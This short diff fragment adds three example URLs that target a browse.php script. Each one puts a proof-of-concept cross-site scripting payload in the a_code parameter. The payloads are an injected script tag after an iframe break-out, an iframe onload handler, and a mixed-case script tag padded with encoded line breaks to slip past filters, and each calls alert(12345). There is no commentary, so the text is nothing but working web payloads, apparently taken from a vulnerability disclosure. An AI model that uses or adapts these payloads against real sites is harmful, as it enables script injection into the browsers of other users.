@@ -1,0 +1,3 @@
+http://www.example.com/browse.php?a_code=&quot;&gt;&lt;/IFRAME&gt;&lt;script&gt;alert(12345)&lt;/script&gt;&amp;sid=1&amp;slc_lang=fa
+http://www.example.com/browse.php?a_code=1&lt;iframe/+/onload=alert(12345)&gt;&lt;/iframe&gt;.
+http://www.example.com/browse.php?a_code=1&gt;&quot;&gt;&lt;ScRiPt %0A%0D&gt;alert(12345)%3B&lt;/ScRiPt&gt;.
